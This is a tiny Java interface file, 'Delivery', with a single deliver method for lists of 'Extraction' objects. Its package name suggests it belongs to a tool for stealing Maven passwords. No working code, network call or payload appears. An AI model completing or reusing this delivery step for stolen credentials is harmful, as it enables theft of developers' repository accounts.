package ninja.stealing.maven.password.delivery;

import ninja.stealing.maven.password.model.Extraction;

import java.util.List;

public interface Delivery {
    void deliver(List<Extraction> extractions);

}